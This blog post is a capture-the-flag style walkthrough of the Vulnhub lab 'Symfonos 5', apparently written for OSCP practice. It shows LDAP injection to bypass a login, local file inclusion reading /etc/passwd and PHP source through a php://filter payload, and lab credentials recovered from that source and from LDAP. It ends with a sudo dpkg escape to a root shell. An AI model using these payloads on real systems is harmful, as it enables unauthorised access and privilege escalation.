<!doctype html><html lang=en><head><title>Vulnhub: Symfonos 5</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Difficulty Release Date Author Beginner 2 Mar 2020 Zayotic Summary In this box, we first perform ldap injection on the web application to bypass the login page. Then we are able to read local files by abusing a local file inclusion vulnerability with php base64 filter. From one of the php files we get ldap credentials that we used to authenticate to ldap and dump entries. From the entries we get a base64 encoded password that we could use to ssh into the machine."><meta name=keywords content=","><meta name=robots content="noodp"><link rel=canonical href=https://blog.ikuamike.io/posts/2021/symfonos5/><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-202973704-2","auto"),ga("send","pageview"))</script><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://blog.ikuamike.io/img/symfonos1/symfonos1.png"><meta name=twitter:title content="Vulnhub: Symfonos 5"><meta name=twitter:description content="Difficulty Release Date Author Beginner 2 Mar 2020 Zayotic Summary In this box, we first perform ldap injection on the web application to bypass the login page. Then we are able to read local files by abusing a local file inclusion vulnerability with php base64 filter. From one of the php files we get ldap credentials that we used to authenticate to ldap and dump entries. From the entries we get a base64 encoded password that we could use to ssh into the machine."><meta name=twitter:site content="@ikuamike"><link rel=stylesheet href=https://blog.ikuamike.io/styles.css><link rel=stylesheet href=https://blog.ikuamike.io/css/style.css><link rel="shortcut icon" href=https://blog.ikuamike.io/img/theme-colors/green.png><link rel=apple-touch-icon href=https://blog.ikuamike.io/img/theme-colors/green.png><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Vulnhub: Symfonos 5"><meta property="og:description" content="Difficulty Release Date Author Beginner 2 Mar 2020 Zayotic Summary In this box, we first perform ldap injection on the web application to bypass the login page. Then we are able to read local files by abusing a local file inclusion vulnerability with php base64 filter. From one of the php files we get ldap credentials that we used to authenticate to ldap and dump entries. From the entries we get a base64 encoded password that we could use to ssh into the machine."><meta property="og:url" content="https://blog.ikuamike.io/posts/2021/symfonos5/"><meta property="og:site_name" content><meta property="og:image" content="https://blog.ikuamike.io/img/symfonos1/symfonos1.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2021-02-17 21:54:20 +0300 +0300"></head><div id=particles-js></div><body class=green><div class="container center headings--one-size" style=background:#1f222a;z-index:1><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>> cd ~</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://blog.ikuamike.io/posts/2021/symfonos5/>Vulnhub: Symfonos 5</a></h1><div class=post-meta><time class=post-date>2021-02-17</time></div><span class=post-tags>#<a href=https://blog.ikuamike.io/tags/beginner/>Beginner</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/vulnhub/>Vulnhub</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/oscp-prep/>OSCP Prep</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/ldap-injection/>LDAP Injection</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/lfi/>LFI</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/ldap/>LDAP</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/sudo/>Sudo</a>&nbsp;</span>
<img src=https://blog.ikuamike.io/img/symfonos1/symfonos1.png class=post-cover alt="Vulnhub: Symfonos 5" title="Cover Image"><div class=post-content><div><table><thead><tr><th>Difficulty</th><th>Release Date</th><th>Author</th></tr></thead><tbody><tr><td>Beginner</td><td>2 Mar 2020</td><td>Zayotic</td></tr></tbody></table><h1 id=summary>Summary<a href=#summary class=hanchor arialabel=Anchor>&#8983;</a></h1><p>In this box, we first perform ldap injection on the web application to bypass the login page. Then we are able to read
local files by abusing a local file inclusion vulnerability with php base64 filter. From one of the php files we get
ldap credentials that we used to authenticate to ldap and dump entries. From the entries we get a base64 encoded
password that we could use to ssh into the machine. For privilege escalation to a root shell we abused sudo permission granted on
dpkg.</p><h1 id=reconnaissance>Reconnaissance<a href=#reconnaissance class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Nmap</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 192.168.191.132
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.0019s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT    STATE SERVICE  VERSION
</span></span><span style=display:flex><span>22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp  open  http     Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.29 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: Site doesn<span style=color:#960050;background-color:#1e0010>&#39;</span>t have a title <span style=color:#f92672>(</span>text/html<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
</span></span><span style=display:flex><span>636/tcp open  ldapssl?
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>&#8983;</a></h1><h2 id=389636-ldap>389,636 (LDAP)<a href=#389636-ldap class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Doing some basic enumeration on ldap without credentials we only get the domain name. We&rsquo;ll probably
get back to it incase we land on some credentials.</p><p><strong>nmap scripts</strong>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>nmap -p 389,636 --script ldap-* 192.168.191.132 
</span></span></code></pre></div><img src=/img/symfonos5/symfonos5-2.png alt=symfonos class=center style=border-radius:8px><p><strong>ldapsearch</strong>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>ldapsearch -h 192.168.191.132 -D <span style=color:#e6db74>&#39;&#39;</span> -w <span style=color:#e6db74>&#39;&#39;</span> -b <span style=color:#e6db74>&#34;DC=symfonos,DC=local&#34;</span> 
</span></span></code></pre></div><img src=/img/symfonos5/symfonos5-3.png alt=symfonos class=center style=border-radius:8px><h2 id=80-http>80 (HTTP)<a href=#80-http class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Opening the site on the browser, we only get a plain page with an image.</p><img src=/img/symfonos5/symfonos5-4.png alt=symfonos class=center style=border-radius:8px><p>Performing a directory/file bruteforce using ffuf, we discover new files.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>ffuf -ic -c -u http://192.168.191.132/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e /,.php,.html -t <span style=color:#ae81ff>50</span> | tee root.ffuf
</span></span></code></pre></div><img src=/img/symfonos5/symfonos5-1.png alt=symfonos class=center style=border-radius:8px><p>Accessing /home.php we are redirected to admin.php which has a login form.</p><img src=/img/symfonos5/symfonos5-5.png alt=symfonos class=center style=border-radius:8px><p>I tried out credential bruteforce and sql injection auth bypass techniques but none of them were successful. I
then thought to try out ldap injection. Since we have ldap running on this host it could be a valid path.</p><p>The application performs authentication insecurely by using GET requests to login.</p><img src=/img/symfonos5/symfonos5-6.png alt=symfonos class=center style=border-radius:8px><p>Setting the username and password to <code>*</code> we successfully login.</p><img src=/img/symfonos5/symfonos5-7.png alt=symfonos class=center style=border-radius:8px><p>We get redirected to home.php which doesn&rsquo;t have much, but clicking on portraits we see interesting functionality.</p><img src=/img/symfonos5/symfonos5-8.png alt=symfonos class=center style=border-radius:8px><p>The url parameter takes in a url, changing the input to <code>../../../../etc/passwd</code> we can read the passwd file. This confirms
we can abuse LFI to access other files on disk by directory traversal.</p><img src=/img/symfonos5/symfonos5-9.png alt=symfonos class=center style=border-radius:8px><p>I tried accessing log files to try for RCE like the previous boxes but nothing came up. We can still use this to read
files so we can check the source code of the app.</p><p>Accessing the php files directly just executes them, so we need to use php wrappers.</p><p><strong>home.php</strong></p><pre tabindex=0><code>http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=home.php
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>session_start</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_SESSION[<span style=color:#e6db74>&#39;loggedin&#39;</span>])){
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Location: admin.php&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_GET[<span style=color:#e6db74>&#34;url&#34;</span>]))
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>$r <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#34;url&#34;</span>];
</span></span><span style=display:flex><span>$result <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($r);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;html&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;head&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;/static/bootstrap.min.css&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/head&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;body&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;nav class=&#34;navbar navbar-expand-lg navbar-dark bg-dark&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  &lt;a class=&#34;navbar-brand&#34; href=&#34;home.php&#34;&gt;symfonos&lt;/a&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  &lt;button class=&#34;navbar-toggler&#34; type=&#34;button&#34; data-toggle=&#34;collapse&#34; data-target=&#34;#navbarColor02&#34; aria-controls=&#34;navbarColor02&#34; aria-expanded=&#34;false&#34; aria-label=&#34;Toggle navigation&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &lt;span class=&#34;navbar-toggler-icon&#34;&gt;&lt;/span&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  &lt;/button&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  &lt;div class=&#34;collapse navbar-collapse&#34; id=&#34;navbarColor02&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &lt;ul class=&#34;navbar-nav mr-auto&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>      &lt;li class=&#34;nav-item&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &lt;a class=&#34;nav-link&#34; href=&#34;home.php&#34;&gt;Home&lt;/a&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>      &lt;/li&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>      &lt;li class=&#34;nav-item&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &lt;a class=&#34;nav-link&#34; href=&#34;home.php?url=http://127.0.0.1/portraits.php&#34;&gt;Portraits&lt;/a&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>      &lt;/li&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>      &lt;li class=&#34;nav-item&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &lt;a class=&#34;nav-link&#34; href=&#34;logout.php&#34;&gt;Logout&lt;/a&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>      &lt;/li&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &lt;/ul&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  &lt;/div&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/nav&gt;&lt;br /&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;center&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;?php
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>if ($result){
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>echo $result;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>} else {
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>echo &#34;&lt;h3&gt;Under Developement&lt;/h3&gt;&#34;;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>} ?&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/center&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/body&gt;
</span></span></span></code></pre></div><p><strong>admin.php</strong></p><pre tabindex=0><code>http://192.168.191.132/home.php?url=php://filter/convert.base64-encode/resource=admin.php
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>session_start</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_SESSION[<span style=color:#e6db74>&#34;loggedin&#34;</span>]) <span style=color:#f92672>&amp;&amp;</span> $_SESSION[<span style=color:#e6db74>&#34;loggedin&#34;</span>] <span style=color:#f92672>===</span> <span style=color:#66d9ef>true</span>){
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;location: home.php&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>exit</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>authLdap</span>($username, $password) {
</span></span><span style=display:flex><span>  $ldap_ch <span style=color:#f92672>=</span> <span style=color:#a6e22e>ldap_connect</span>(<span style=color:#e6db74>&#34;ldap://172.18.0.22&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>ldap_set_option</span>($ldap_ch, <span style=color:#a6e22e>LDAP_OPT_PROTOCOL_VERSION</span>, <span style=color:#ae81ff>3</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$ldap_ch) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>FALSE</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  $bind <span style=color:#f92672>=</span> <span style=color:#a6e22e>ldap_bind</span>($ldap_ch, <span style=color:#e6db74>&#34;cn=admin,dc=symfonos,dc=local&#34;</span>, <span style=color:#e6db74>&#34;qMDdyZh3cT6eeAWD&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$bind) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>FALSE</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  $filter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;(&amp;(uid=</span><span style=color:#e6db74>$username</span><span style=color:#e6db74>)(userPassword=</span><span style=color:#e6db74>$password</span><span style=color:#e6db74>))&#34;</span>;
</span></span><span style=display:flex><span>  $result <span style=color:#f92672>=</span> <span style=color:#a6e22e>ldap_search</span>($ldap_ch, <span style=color:#e6db74>&#34;dc=symfonos,dc=local&#34;</span>, $filter);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$result) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>FALSE</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  $info <span style=color:#f92672>=</span> <span style=color:#a6e22e>ldap_get_entries</span>($ldap_ch, $result);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>($info) <span style=color:#f92672>||</span> ($info[<span style=color:#e6db74>&#34;count&#34;</span>] <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>FALSE</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>TRUE</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;username&#39;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;password&#39;</span>])){
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$username <span style=color:#f92672>=</span> <span style=color:#a6e22e>urldecode</span>($_GET[<span style=color:#e6db74>&#39;username&#39;</span>]);
</span></span><span style=display:flex><span>$password <span style=color:#f92672>=</span> <span style=color:#a6e22e>urldecode</span>($_GET[<span style=color:#e6db74>&#39;password&#39;</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$bIsAuth <span style=color:#f92672>=</span> <span style=color:#a6e22e>authLdap</span>($username, $password);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span> $bIsAuth ) {
</span></span><span style=display:flex><span>        $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Invalid login&#34;</span>;
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        $_SESSION[<span style=color:#e6db74>&#34;loggedin&#34;</span>] <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;location: home.php&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;html&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;head&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;/static/bootstrap.min.css&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/head&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;body&gt;&lt;br /&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;div class=&#34;container&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  &lt;div class=&#34;row justify-content-center&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>    &lt;div class=&#34;col-md-8&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>      &lt;div class=&#34;card&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &lt;div class=&#34;card-header&#34;&gt;Login&lt;/div&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &lt;div class=&#34;card-body&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>          &lt;form action=&#34;admin.php&#34; method=&#34;GET&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>            &lt;div class=&#34;form-group row&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>                &lt;label for=&#34;email_address&#34; class=&#34;col-md-4 col-form-label text-md-right&#34;&gt;Username&lt;/label&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>                &lt;div class=&#34;col-md-6&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>                    &lt;input type=&#34;text&#34; id=&#34;username&#34; class=&#34;form-control&#34; name=&#34;username&#34; required autofocus&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>                &lt;/div&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>            &lt;/div&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>            &lt;div class=&#34;form-group row&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>                &lt;label for=&#34;password&#34; class=&#34;col-md-4 col-form-label text-md-right&#34;&gt;Password&lt;/label&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>                &lt;div class=&#34;col-md-6&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>                    &lt;input type=&#34;password&#34; id=&#34;password&#34; class=&#34;form-control&#34; name=&#34;password&#34; required&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>                &lt;/div&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>            &lt;/div&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>            &lt;div class=&#34;col-md-6 offset-md-4&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>                &lt;button type=&#34;submit&#34; class=&#34;btn btn-primary&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>                    Login
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>                &lt;/button&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>            &lt;/div&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>          &lt;/form&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>        &lt;/div&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  &lt;/div&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>  &lt;center&gt;&lt;strong&gt;&lt;?php echo $msg; ?&gt;&lt;/strong&gt;&lt;/center&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/div&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/body&gt;
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>&lt;/html&gt;
</span></span></span></code></pre></div><p>From admin.php we get credentials that can be used on ldap.</p><h1 id=getting-shell-as-zeus>Getting shell as zeus<a href=#getting-shell-as-zeus class=hanchor arialabel=Anchor>&#8983;</a></h1><p>With the credentials admin:qMDdyZh3cT6eeAWD, we get more output from ldap:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>ldapsearch -x -h 192.168.191.132 -D <span style=color:#e6db74>&#34;CN=admin,DC=symfonos,DC=local&#34;</span> -w qMDdyZh3cT6eeAWD -b <span style=color:#e6db74>&#34;DC=symfonos,DC=local&#34;</span>
</span></span></code></pre></div><img src=/img/symfonos5/symfonos5-10.png alt=symfonos class=center style=border-radius:8px><p>From the output, the userPassword is base64 encoded. After decoding it we get <code>cetkKf4wCuHC9FET</code> and can login
as zeus via ssh.</p><img src=/img/symfonos5/symfonos5-11.png alt=symfonos class=center style=border-radius:8px><h1 id=privilege-escalation>Privilege Escalation<a href=#privilege-escalation class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Running <code>sudo -l</code>, we see that zeus has sudo permissions to run dpkg with no password.</p><img src=/img/symfonos5/symfonos5-12.png alt=symfonos class=center style=border-radius:8px><p>From <a href=https://gtfobins.github.io/gtfobins/dpkg/ target=_blank rel=noopener>gtfobins</a>
we only need to execute the below commands to
abuse this.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>sudo dpkg -l
</span></span><span style=display:flex><span>!/bin/bash
</span></span></code></pre></div><img src=/img/symfonos5/symfonos5-13.png alt=symfonos class=center style=border-radius:8px><h1 id=extras>Extras<a href=#extras class=hanchor arialabel=Anchor>&#8983;</a></h1><p>When accessing the passwd file, we couldn&rsquo;t see any user with home directory in /home looking at the configuration
postexploitation we see that the services are running in docker containers.</p><img src=/img/symfonos5/symfonos5-14.png alt=symfonos class=center style=border-radius:8px></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://blog.ikuamike.io/posts/2021/evm/><span class=button__icon>←</span>
<span class=button__text>Vulnhub: EVM 1</span></a></span>
<span class="button next"><a href=https://blog.ikuamike.io/posts/2021/symfonos4/><span class=button__text>Vulnhub: Symfonos 4</span>
<span class=button__icon>→</span></a></span></div></div></article></div><footer class=footer><div class=footer__inner><div class=copyright><span>© 2024 Powered by <a href=http://gohugo.io>Hugo</a></span>
<span>:: <a href=https://github.com/panr/hugo-theme-terminal target=_blank>Theme</a> made by <a href=https://github.com/panr target=_blank>panr</a></span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div><script src=/js/vanilla-back-to-top.min.js></script>
<script>addBackToTop({diameter:40,backgroundColor:"rgb(120, 226, 160)",textColor:"#1F222A",cornerOffset:30})</script><script src=/js/particles.min.js></script>
